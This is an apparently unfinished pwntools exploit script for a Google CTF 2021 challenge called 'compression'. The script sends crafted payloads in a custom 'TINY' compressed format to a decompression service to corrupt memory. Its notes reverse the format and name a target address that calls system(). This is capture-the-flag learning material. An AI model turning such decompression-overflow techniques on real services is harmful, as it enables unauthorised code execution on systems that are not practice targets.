#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long
from pwn import *
from time import sleep

service = 'compression.2021.ctfcompetition.com'
port = 1337
binary = './compress'

commands = '''
b main
c
b *decompress+343
c
'''
if len(sys.argv) > 1 and sys.argv[1] == 'debug':
    r = gdb.debug([binary], commands)
elif len(sys.argv) > 1 and sys.argv[1] == 'local':
    r = process(binary)
else:
    r = remote(service, port)

def compress(s):
    sleep(0.1)
    r.recv()
    r.sendline('1')
    sleep(0.1)
    r.recv()
    r.sendline(s)
    sleep(0.1)
    return r.recv(timeout=0.1)

def decompress(s):
    sleep(0.1)
    r.recv()
    r.sendline('2')
    sleep(0.1)
    r.recv()
    r.sendline(s)
    sleep(0.1)
    return r.recv(timeout=0.1)

#res = compress('AB' * 80)
#print(res.decode())

pld =  '54494e59' # TINY
pld += 'aabb' # hex sequence
pld += 'ff' # end of sequence
pld += '02' # nb bytes in sequence
pld += '79' # repeat sequence n times
pld += 'ff0000' # end of compressed string

log.info(f'sending {pld}')
res = decompress(pld)
print(res.decode())

r.interactive()

'''
we want to jump to 0x00101341 -> system('cat FORMAT.md')

'A' * 8000 -> 54494e59 aa ff01 9f1f ff0000
'A' * 80   -> 54494e59 aa ff01 27   ff0000
'B' * 80   -> 54494e59 bb ff01 27   ff0000
'AB' * 80  -> 54494e59 ab ff01 4f   ff0000
'A' * 1    -> 54494e59 aa           ff0000

54494e59 XX          ff 01      27     ff0000
TINY     hexsequence ff nbbytes repeat ff0000

aabbccaabbccaabbccaabbcc184725
54494e59aabbccff0309184725ff0000

54494e59 aabbcc ff 03 09 184725 ff0000

These 0 bytes compress to 7 bytes (inf%):
54494e59ff0000
'''

# TODO: take a look at the sol
